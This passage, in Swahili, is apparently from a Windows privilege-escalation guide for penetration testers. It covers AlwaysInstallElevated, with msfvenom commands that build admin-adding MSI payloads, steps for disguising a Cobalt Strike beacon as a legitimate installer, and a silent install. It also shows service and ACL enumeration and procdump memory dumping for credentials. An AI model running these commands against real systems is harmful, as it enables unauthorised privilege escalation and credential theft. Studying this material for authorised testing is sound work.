Kagua sera halisi ya DC ya [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) na [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL ya object ya utambulisho unaorelayiwa, na viwango vya uthibitishaji na uigaji (impersonation) vya COM class iliyochaguliwa. Aina ya logon ya mpigaji na muktadha wa credential ni muhimu: kipindi cha WinRM kinaweza kufanya kazi tofauti na logon ya mwingiliano au ya new-credentials. Firewall/OXID routing na masasisho yaliyosakinishwa yanaweza pia kubadilisha matokeo. Chukulia sera inayoruhusu au ACL inayolingana kuwa mambo ya kuchunguzwa; uhesabuji usiotenda haupaswi kuanzisha COM coercion, uthibitishaji wa relay, au uandishi wa directory. Shadow credential ya akaunti ya mashine inaweza kusababisha tiketi ya mashine na, iwapo tu akaunti hiyo ina haki zinazohitajika za replication ya directory, njia tofauti ya DCSync.

Tafuta **exploit katika** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Kwa maelezo zaidi kuhusu mtiririko wa shambulio, angalia [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Ikiwa** rejista hizi 2 **zimewezeshwa** (thamani ni **0x1**), basi watumiaji wenye kiwango chochote cha ruhusa wanaweza **kusakinisha** (kutekeleza) faili za `*.msi` kama NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Ikiwa una session ya meterpreter, unaweza kuendesha mbinu hii kiotomatiki kwa kutumia module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Tumia amri ya `Write-UserAddMSI` kutoka power-up kuunda ndani ya saraka ya sasa binary ya Windows MSI kwa ajili ya kuongeza marupurupu. Script hii huandika installer ya MSI iliyokompiliwa awali ambayo huomba kuongeza mtumiaji/kikundi (kwa hiyo utahitaji ufikiaji wa GIU):

```
Write-UserAddMSI
```

Tekeleza tu binary iliyoundwa ili kupandisha marupurupu.

### MSI Wrapper

Soma mafunzo haya ili ujifunze jinsi ya kuunda MSI wrapper kwa kutumia zana hizi. Kumbuka kwamba unaweza kufunga faili ya "**.bat**" ikiwa **unataka tu** **kutekeleza** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Tengeneza** Windows EXE TCP payload **mpya** kwa kutumia Cobalt Strike au Metasploit kwenye `C:\privesc\beacon.exe`
- Fungua **Visual Studio**, chagua **Create a new project** na uandike "installer" kwenye kisanduku cha kutafutia. Chagua mradi wa **Setup Wizard** na ubofye **Next**.
- Ipe mradi jina, kama **AlwaysPrivesc**, tumia **`C:\privesc`** kama eneo, chagua **place solution and project in the same directory**, na ubofye **Create**.
- Endelea kubofya **Next** hadi ufike hatua ya 3 kati ya 4 (chagua faili za kujumuisha). Bofya **Add** na uchague Beacon payload uliyotengeneza hivi punde. Kisha ubofye **Finish**.
- Chagua mradi wa **AlwaysPrivesc** kwenye **Solution Explorer** na kwenye **Properties**, badilisha **TargetPlatform** kutoka **x86** hadi **x64**.
  - Kuna properties nyingine unazoweza kubadilisha, kama **Author** na **Manufacturer**, ambazo zinaweza kufanya programu iliyosakinishwa ionekane halali zaidi.
- Bofya mradi kwa kitufe cha kulia na uchague **View > Custom Actions**.
- Bofya **Install** kwa kitufe cha kulia na uchague **Add Custom Action**.
- Bofya mara mbili **Application Folder**, chagua faili yako ya **beacon.exe** na ubofye **OK**. Hii itahakikisha kwamba Beacon payload inatekelezwa mara tu installer inapoendeshwa.
- Chini ya **Custom Action Properties**, badilisha **Run64Bit** kuwa **True**.
- Mwishowe, **ijenge**.
  - Ikiwa onyo `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` litaonyeshwa, hakikisha umeweka platform kuwa x64.

### Usakinishaji wa MSI

Ili kutekeleza **usakinishaji** wa faili hasidi ya `.msi` **chinichini:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Ili kutumia udhaifu huu unaweza kutumia: _exploit/windows/local/always_install_elevated_

## Antivirus na Vigunduzi

### Mipangilio ya Ukaguzi

Mipangilio hii huamua kinachorekodiwa, kwa hiyo unapaswa kuizingatia.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding, inafurahisha kujua logs zinatumwa wapi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** imeundwa kwa ajili ya **usimamizi wa nywila za Administrator wa ndani**, na kuhakikisha kuwa kila nywila ni **ya kipekee, inazalishwa kwa nasibu, na inasasishwa mara kwa mara** kwenye kompyuta zilizounganishwa kwenye domain. Nywila hizi huhifadhiwa kwa usalama ndani ya Active Directory na zinaweza kufikiwa tu na watumiaji waliopewa ruhusa za kutosha kupitia ACLs, na hivyo kuwaruhusu kuona nywila za admin wa ndani ikiwa wameidhinishwa.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ikiwa imewezeshwa, **nywila za maandishi ya kawaida huhifadhiwa kwenye LSASS** (Local Security Authority Subsystem Service).\
[**Maelezo zaidi kuhusu WDigest kwenye ukurasa huu**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### Ulinzi wa LSA

Kuanzia **Windows 8.1**, Microsoft ilianzisha ulinzi ulioimarishwa kwa Local Security Authority (LSA) ili **kuzuia** majaribio ya michakato isiyoaminika **kusoma kumbukumbu zake** au kuingiza msimbo, na hivyo kuimarisha usalama wa mfumo.\
[**Maelezo zaidi kuhusu Ulinzi wa LSA hapa**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** ilianzishwa katika **Windows 10**. Madhumuni yake ni kulinda vitambulisho vilivyohifadhiwa kwenye kifaa dhidi ya vitisho kama vile pass-the-hash attacks. [**Maelezo zaidi kuhusu Credential Guard yanapatikana hapa.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Credentials Zilizohifadhiwa kwenye Cache

**Credentials za domain** huthibitishwa na **Local Security Authority** (LSA) na kutumiwa na vipengele vya mfumo wa uendeshaji. Data ya kuingia ya mtumiaji inapothibitishwa na kifurushi cha usalama kilichosajiliwa, kwa kawaida credentials za domain za mtumiaji huanzishwa.\
[**Maelezo zaidi kuhusu Credentials Zilizohifadhiwa kwenye Cache hapa**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Watumiaji na Vikundi

### Orodhesha Watumiaji na Vikundi

Unapaswa kuangalia ikiwa kikundi chochote unachoshiriki kina ruhusa za kuvutia.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Vikundi vyenye mapendeleo

Ikiwa wewe ni mwanachama wa kikundi chenye mapendeleo, unaweza kuongeza privileges. Jifunze kuhusu vikundi vyenye mapendeleo na jinsi ya kuvitumia vibaya ili kuongeza privileges hapa:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Jifunze zaidi** kuhusu maana ya **token** kwenye ukurasa huu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Angalia ukurasa ufuatao ili **ujifunze kuhusu token zinazovutia** na jinsi ya kuzitumia vibaya:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Watumiaji walioingia / Sessions

```bash
qwinsta
klist sessions
```

### Folda za nyumbani

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Sera ya Nenosiri

```bash
net accounts
```

### Pata maudhui ya clipboard

```bash
powershell -command "Get-Clipboard"
```

## Michakato Inayoendeshwa

### Ruhusa za Faili na Folda

Kwanza kabisa, unapoorodhesha michakato **angalia kama kuna nywila ndani ya command line ya mchakato**.\
Angalia kama unaweza **kubadilisha binary yoyote inayoendeshwa** au kama una ruhusa za kuandika kwenye folda ya binary ili kutumia uwezekano wa [**mashambulizi ya DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Kagua kila mara kama kuna [**electron/cef/chromium debuggers** zinazoendesha; unaweza kuzitumia vibaya ili kuongeza marupurupu](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Debugger listener inaweza kuwepo kwa muda mfupi, kwa hivyo kutokuwepo kwake kwenye picha moja tuli ya port hakuthibitishi kwamba haikuwahi kufichuliwa. Linganisha listener yoyote uliyoona na PID yake, mmiliki wa process, na uwezo wa mtumiaji mwenye marupurupu ya chini kuifikia; jina la programu au debug flag pekee havithibitishi uwezo wa kutekeleza code kutoka akaunti nyingine. Fanya uorodheshaji wa kawaida bila kutuma amri za debugger.

**Kuangalia ruhusa za binary za process**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Kukagua ruhusa za folda za binary za michakato (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Saraka za dynamic preprocessor za Snort

Snort 2 inaweza kupakia shared libraries kutoka kwenye `dynamicpreprocessor directory` iliyotangazwa kwenye usanidi uliochaguliwa kwa `snort.exe -c <config>`. Kwa scheduled task au service inayoendesha Snort chini ya akaunti tofauti, kagua usanidi huo mahususi na ACL ya saraka ya module iliyotangazwa. Ikiwa token yako inaweza kuunda faili hapo, njia hiyo inafaa kuchunguzwa kama uwezekano wa code execution wakati task au service hiyo itakapopakia modules tena. Thibitisha privileges halisi za akaunti ya run-as, usanidi unaotumika, ulinganifu wa module, na vizuizi vyovyote vya deny au share; saraka inayoweza kuandikwa pekee haithibitishi escalation. [Nyaraka za Snort kuhusu dynamic-preprocessor](https://www.snort.org/documents/dpx-readme) zinaeleza upakiaji wa module wakati wa runtime.

### Web service yenye privileges na document root inayoweza kuandikwa

Kwenye usakinishaji wa Apache wa Windows, linganisha njia ya executable ya service na akaunti ya run-as na `DocumentRoot` katika `httpd.conf` yake inayotumika. Kwa mpangilio wa kawaida wa XAMPP, kagua `C:\xampp\apache\conf\httpd.conf` na ACL ya document root iliyosanidiwa, ambayo mara nyingi ni `C:\xampp\htdocs`. Ikiwa mtumiaji mwenye privileges za chini anaweza kuunda faili kwenye root hiyo huku Apache ikiendeshwa kama `LocalSystem`, server-side code execution inaweza kuvuka mpaka wa privileges wa host. Thibitisha kuwa service inaendeshwa, njia hiyo mahususi ndiyo inayohudumiwa, na server-side handler inachakata aina ya faili hiyo; root inayoweza kuandikwa yenyewe inathibitisha uundaji wa faili pekee. Kagua ACL bila kuandika probe:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Kwa usakinishaji wa kawaida wa WAMP, service inaweza kuelekeza kwenye toleo maalum la `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (au `C:\wamp\...` kwa muundo wa 32-bit), huku configuration ikiwa karibu nayo chini ya `conf\httpd.conf` na root chaguomsingi ikiwa `C:\wamp64\www` au `C:\wamp\www`. Kagua kwa pamoja image halisi ya service, utambulisho inayotumia kuendesha, `DocumentRoot` inayotumika (pamoja na upanuzi wa `${INSTALL_DIR}` na overrides za virtual host), na ACL ya root. Directory ya WAMP inayoweza kuandikwa haithibitishi kuwa Apache inaendeshwa kama `SYSTEM` au inatekeleza faili iliyowasilishwa. [Apache inaeleza jinsi Windows service inavyochagua configuration yake](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Root ya IIS inayoweza kuandikwa na utambulisho wa network wa application pool

Kwa IIS, linganisha directory halisi inayoweza kuandikwa na **site/application inayotumika** katika `applicationHost.config`, kisha tambua pool na handler ya upande wa server iliyosanidiwa kwa hiyo site/application. Code iliyowekwa kwenye directory inayotolewa na server huendeshwa kama pool ikiwa tu IIS inachakata aina hiyo ya faili na route inaweza kufikiwa. Kagua ruhusa za sasa za mtumiaji za kuunda faili, hali ya runtime ya site, handler na overrides za kila path kabla ya kuchukulia directory inayoweza kuandikwa kuwa inaweza kutekeleza code.

Dynamic compilation ya ASP.NET huleta path tofauti ya kukagua: faili zinazozalishwa chini ya directory ya compilation ya application. Chaguomsingi ni directory ya `Temporary ASP.NET Files` chini ya usakinishaji husika wa .NET Framework, lakini `<compilation tempDirectory>` ya application inaweza kuibadilisha. [Microsoft inaeleza eneo hilo na subdirectory za kila application](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) na [inapendekeza kutenga directory za compilation ikiwa application pool haziaminiani](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Ikiwa token yenye mapendeleo ya chini inaweza kubadilisha source iliyozalishwa kwenye cache ya **application husika**, tambua kama application hiyo itairecompile chini ya [utambulisho wa worker process](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) wenye mapendeleo ya juu zaidi. ACL ya faili au directory pekee haithibitishi utekelezaji wa code: linganisha cache na application inayotumika, token na ACL zinazotumika, mipangilio ya compilation, utambulisho wa process, na muda wa recompile yoyote. Tumia ukaguzi wa metadata unaosoma tu; usianzishe compilation au kubadilisha faili za cache wakati wa enumeration.

IIS pool iliyosanidiwa kama `ApplicationPoolIdentity` au `NetworkService` kwa kawaida hujithibitisha kwa kutumia **akaunti ya kompyuta ya host** inapofikia rasilimali za domain, ingawa token yake ya ndani inaweza kuwa na mapendeleo ya chini. `LocalSystem` tayari ina mapendeleo ya juu kwenye mashine ya ndani na pia hutumia akaunti ya kompyuta kwenye network; `LocalService` kwa kawaida hutumia credentials za network zisizojulikana. Pool ya `SpecificUser` hutumia akaunti yake iliyosanidiwa. [Microsoft inaeleza aina hizi za utambulisho](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) na [utambulisho wa network wa application pool](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Mpangilio wa utambulisho usipoainishwa unaweza kurithi defaults za pool, ambazo hutofautiana kati ya matoleo ya IIS, kwa hiyo bainisha configuration inayotumika badala ya kubashiri kutokana na jina la pool. Ikiwa code execution inafikia pool yenye utambulisho wa network wa akaunti ya kompyuta, tathmini ruhusa za directory za **kompyuta hiyo mahususi**. [DCSync](../active-directory-methodology/dcsync.md) inahitaji ruhusa za replication kwenye domain naming context; ticket ya akaunti ya mashine au jukumu la host pekee havithibitishi ruhusa hizo. Passive enumeration inapaswa kukagua configuration na ACL bila kupakia faili, kuanzisha network authentication, au kuomba tickets.

Kwa ASP.NET handler inayosomeka na inayoanzisha helper process, fuatilia thamani yoyote inayotokana na request kupitia authentication, decryption, validation, na ujenzi wa command. Handler inayounganisha token iliyodecodeiwa kwenye `ProcessStartInfo("cmd", "/c ...")` inaweza kuruhusu shell metacharacters kubadilisha command; [Microsoft inaeleza herufi maalum za `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Thibitisha kuwa caller asiyeaminika anaweza kweli kuathiri thamani iliyodecodeiwa na kufikia handler, kisha bainisha utambulisho unaotumika wa application pool au wa impersonation pamoja na utambulisho wa child process. Mstari wa source unaosomeka, listener ya localhost, au udhaifu wa muundo wa token pekee havithibitishi utekelezaji wa command wenye mapendeleo ya juu. Kagua source na configuration ya pool bila kutuma requests ghushi au kuendesha helper wakati wa passive enumeration.

Kwa PHP service kwenye Windows, path inayodhibitiwa na request na kupitishwa kwa [`include` au `require`](https://www.php.net/manual/en/function.include.php) inaweza kutekeleza faili ya PHP inayoweza kuandikwa na mtumiaji mwenye mapendeleo ya chini, kwa kutumia utambulisho wa worker. Thibitisha kuwa request inaweza kufikia statement hiyo, path inayotatuliwa inaelekeza kwenye faili ambayo mtumiaji mwenye mapendeleo ya chini anaweza kubadilisha na worker anaweza kusoma, vikwazo vya PHP vya path vinavyotumika vinaruhusu include, na worker kwa kweli inaendeshwa ikiwa na mapendeleo ya juu zaidi. Listener ya loopback au faili inayoweza kuandikwa pekee havithibitishi mlolongo huu; kagua source, utambulisho wa service, na ACL za faili bila kuita endpoint wakati wa passive enumeration.

### Uchimbaji wa Password kwenye Memory

Unaweza kuunda memory dump ya process inayoendeshwa kwa kutumia **procdump** kutoka sysinternals. Services kama FTP huwa na **credentials zikiwa clear text kwenye memory**; jaribu kudump memory na kusoma credentials.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Programu za GUI zisizo salama

**Programu zinazoendeshwa kama SYSTEM zinaweza kumruhusu mtumiaji kufungua CMD au kuvinjari saraka.**

Mfano: "Windows Help and Support" (Windows + F1), tafuta "command prompt", bofya "Click to open Command Prompt"

### Uingizaji wa faili za project zenye ruhusa za juu

Programu inayofungua project kiotomatiki kutoka kwenye saraka ya kushuka inayoweza kuandikwa na mtumiaji mwenye ruhusa za chini huvuka mpaka wa uaminifu wa ingizo chini ya akaunti ya programu inayoingiza. Kagua **njia halisi inayoweza kuandikwa**, mchakato au task inayoifungua, utambulisho wake unaotumika, na build ya parser. Tatizo la kihistoria la kufungua/kurejesha project ya Ghidra ([historical Ghidra project open/restore issue](https://github.com/NationalSecurityAgency/ghidra/issues/71)) liliruhusu XML external entities kwenye metadata ya project; entity ya mtandao kwenye Windows inaweza kusababisha uthibitishaji kutoka kwa akaunti inayoingiza ikiwa [sera za outbound SMB na NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) zinaruhusu. Hili ni dalili ya kufichuka kwa vitambulisho, si ufikiaji wa msimamizi wa moja kwa moja: jibu lazima liweze kutumika kupitia njia tofauti iliyoidhinishwa au yenye udhaifu, na builds za sasa lazima zitathminiwe kulingana na hali halisi ya viraka vyake. Usifungue project iliyoundwa mahsusi wakati wa uchunguzi tuli; kagua mtiririko wa uingizaji na ACL.

## Huduma

Ruhusa ya [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) kwenye object ya Service Control Manager (SCM) ni tofauti na ruhusa kwenye huduma iliyopo. Ombi la ufikiaji la kusoma pekee la [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) lililofanikiwa kwa ruhusa hiyo ni dalili ya kuchunguza, si uthibitisho kwamba huduma mpya inaweza kuendeshwa. [`CreateService` hurejesha handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) yenye ruhusa za huduma zilizoombwa wakati wa uundaji; kufungua huduma tena baadaye hufanya ukaguzi tofauti wa ufikiaji na kunaweza kushindwa hata kama handle ya awali ingeweza kutumika. Thibitisha kivyake tokeni inayotumika ya ndani au ya mbali, ruhusa za handle zilizotolewa, akaunti ya huduma, sera ya kuanzisha, na njia ya executable. Usitengeneze au kuanzisha huduma wakati wa uchunguzi tuli.

Kwa njia ya kusakinisha huduma kwa mbali, linganisha ruhusa hizo za SCM na share kwenye target ambayo **logon hiyo hiyo ya mtandao** inaweza kuandikia, ACL yake ya msingi ya NTFS, na njia ya ndani ya executable ambayo akaunti ya huduma inaweza kuendesha. Akaunti isiyo ya admin inaweza kuvuka mpaka huu ikiwa kuna ruhusa pana isiyo ya kawaida za SCM na njia ya kuweka faili; share ya msimamizi si sharti la lazima. Ruhusa ya kuandika kwenye share pekee, au dalili pekee ya ruhusa ya kuunda huduma ya SCM, hazithibitishi kuwa huduma mpya inaweza kuanza chini ya utambulisho wa juu zaidi.

Huduma iliyopo inaweza kuendesha executable saidizi wakati wa kuanza, kuzima, au tukio jingine la mzunguko wa maisha hata kama executable hiyo haipo kwenye `ImagePath` yake. Ikiwa jina la executable saidizi linatafutwa kwenye saraka inayoweza kuandikwa na mtumiaji mwenye ruhusa za chini na huduma inaendeshwa chini ya utambulisho wa juu zaidi, faili saidizi inayokosekana inaweza kuwa mgombea wa kubadilishwa kwa masharti. Thibitisha **code halisi ya huduma au mwito wa executable saidizi ulioandikwa kwenye nyaraka**, njia ya executable iliyotatuliwa na mpangilio wa utafutaji, ruhusa za kuunda saraka, utambulisho wa huduma, na kichocheo cha mzunguko wa maisha kinachopatikana. Saraka ya huduma inayoweza kuandikwa au faili inayokosekana pekee havithibitishi kuwa huduma itapakia faili hiyo; uchunguzi tuli haupaswi kuanzisha au kusimamisha huduma.

Kwa huduma iliyopo, [`SERVICE_START huruhusu kutoa hoja kwa StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); ni tofauti na [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Kagua code ya huduma au kiolesura chake kilichoandikwa kwenye nyaraka kabla ya kuchukulia ruhusa ya kuianzisha kuwa zaidi ya ruhusa ya kuidhibiti. Ikiwa inatumia hoja iliyochaguliwa na mpigaji kama njia ya log au export, thibitisha utambulisho wa huduma, mtiririko halisi wa hoja hadi uandishi, vizuizi vya njia, na ruhusa za **faili iliyoundwa**. Uandishi kwenye saraka iliyolindwa unaweza kuwa njia ya kupandisha ruhusa tu ikiwa kuna mtumiaji au loader tofauti mwenye ruhusa za juu inayokubali faili hiyo; log inayoweza kuandikwa au ruhusa ya kuanzisha pekee haitoshi. Orodha tuli haipaswi kuanzisha huduma au kuunda faili ya majaribio.

Kwa wakala wa ufuatiliaji wa NSClient++, faili ya `nsclient.ini` inayoweza kusomwa ni **dalili ya kukagua usanidi**: huenda ikawa na vitambulisho vya web, huku `boot.ini` ikielekeza usanidi kwenye eneo jingine. Kagua akaunti halisi ya huduma, listener ya WEB na sera ya ufikiaji, na kama role iliyothibitishwa inaweza kubadilisha mipangilio au scripts. Utekelezaji wenye ruhusa za juu pia unahitaji `CheckExternalScripts` (au njia nyingine ya utekelezaji iliyowezeshwa), ruhusa inayotumika ya kusajili au kurekebisha amri, na kichocheo kinachoiendesha chini ya utambulisho wa huduma. Listener inayosikiliza kwenye loopback pekee bado inaweza kufikiwa na mtumiaji wa ndani, lakini njia ya faili, nenosiri, au listener pekee havithibitishi ruhusa hizo. Kagua metadata na ruhusa bila kuonyesha siri au kuita web API wakati wa uchunguzi tuli. Tazama [mpangilio wa faili za NSClient++](https://nsclient.org/docs/concepts/file-layout/), [mwongozo wa usalama wa web na script](https://nsclient.org/docs/setup/securing/), na [usanidi wa external-script](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Kwa huduma ambayo `ImagePath` yake ni `nssm.exe`, kagua akaunti halisi ya huduma inayoendesha na thamani yake ya `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM huhifadhi programu tanzu hapo](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), huku `AppDirectory` ikiwa saraka yake ya kazi iliyosanidiwa. Kagua executable tanzu na ACL za saraka yake kuu kabla ya kuchukulia ruhusa za wrapper kuwa ndizo mpaka mzima wa huduma. Endpoint ya ndani ya WCF au SOAP inayofichuliwa na programu tanzu hiyo ni dalili tofauti ya kuchunguza: thibitisha kuwa mtumiaji mwenye ruhusa za chini anaweza kufikia listener, kwamba operation husika inakubali ingizo lake, na kwamba programu tanzu ya huduma inatekeleza operation isiyo salama chini ya utambulisho wa juu zaidi. Akaunti ya huduma, URL ya endpoint, au njia inayoweza kuandikwa pekee havithibitishi uwezekano wa kupandisha ruhusa; epuka kuita operations za huduma wakati wa uchunguzi tuli.

Kwa operation maalum ya WCF, fuatilia string inayodhibitiwa na mpigaji inapoingia kwenye PowerShell runspace. [`Pipeline.Commands.AddScript huongeza maandishi ya script`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), na [`Pipeline.Invoke huendesha pipeline`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding yenye vitambulisho vya usafirishaji vya Windows`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) huthibitisha utambulisho wa client, lakini ruhusa ya kuita operation **hiyo mahususi** na utambulisho unaotumika wa runspace lazima vikaguliwe kivyake. Njia kutoka kwenye ingizo la mpigaji mwenye ruhusa za chini hadi `AddScript` chini ya utambulisho wa huduma yenye ruhusa za juu ni mpaka wa utekelezaji wa code; port inayosikiliza, client aliyethibitishwa, au method isiyotumika kwenye assembly isiyohusiana pekee si uthibitisho. Kagua huduma iliyosakinishwa, contract, ruhusa, na mipangilio ya impersonation kwa njia tuli bila kuita endpoint wakati wa uchunguzi.

Service Triggers huruhusu Windows kuanzisha huduma hali fulani zinapotokea (shughuli ya named pipe/RPC endpoint, matukio ya ETW, upatikanaji wa IP, kifaa kuunganishwa, GPO refresh, n.k.). Hata bila ruhusa za SERVICE_START, mara nyingi unaweza kuanzisha huduma zenye ruhusa za juu kwa kuwasha triggers zake. Tazama mbinu za kuorodhesha na kuwasha hapa:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Huduma ya Visual Studio ya kukusanya taarifa za uchunguzi

Usakinishaji wa Visual Studio wenye zana za C/C++ unaweza kujumuisha `VSStandardCollectorService150`, huduma ya uchunguzi iliyosanidiwa kuendeshwa kama `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) ilitumia race ya junction na object-manager-link kuelekeza upya uwekaji upya wa DACL ya huduma. Upandishaji wa ruhusa ulioonyeshwa ulihitaji pia njia inayoweza kutumika ya kurekebisha MSI ya Visual Studio Setup WMI Provider pamoja na target yake ya `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Kipengele hicho kilirekebishwa Januari 2024.

Kwa uchunguzi tuli wa awali, kagua akaunti na njia ya binary ya huduma hiyo, hakikisha kama njia ya Setup WMI compiler ipo, na thibitisha hali ya viraka vya kipengele kilichosakinishwa. Ingizo la huduma, toleo la bidhaa ya Visual Studio, au faili ya compiler pekee havithibitishi kuwa host ina udhaifu. Ukaguzi hauhitaji kuanzisha huduma au kuendesha repair.

Pata orodha ya huduma:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Ruhusa

Unaweza kutumia **sc** kupata taarifa kuhusu huduma.

```bash
sc qc <service_name>
```

Inapendekezwa kuwa na binary **accesschk** kutoka _Sysinternals_ ili kuangalia kiwango cha upendeleo kinachohitajika kwa kila huduma.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Inapendekezwa kuangalia ikiwa "Authenticated Users" wanaweza kurekebisha huduma yoyote:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Unaweza kupakua accesschk.exe ya XP hapa](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Washa service

Ikiwa unapata hitilafu hii (kwa mfano, na SSDPSRV):

_Hitilafu ya mfumo 1058 imetokea._\
_Service haiwezi kuanzishwa, kwa sababu imezimwa au hakuna vifaa vilivyowezeshwa vinavyohusishwa nayo._

Unaweza kuiwezesha kwa kutumia

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

